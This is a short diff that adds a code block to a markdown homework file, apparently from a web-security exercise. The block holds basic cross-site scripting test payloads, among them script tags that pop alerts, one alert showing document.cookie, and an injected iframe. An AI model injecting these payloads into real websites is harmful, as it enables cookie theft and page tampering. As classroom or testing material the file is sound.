@@ -1,3 +1,12 @@
+```
+<script> alert("XSS!");</script>
+<scrIPT>
+<script> alert(document.cookie)</script> 
+<iframe width=333 height=333 src=tw.yahoo.com> </iframe>
+
+
+```
+
 # 作業
 
 ```
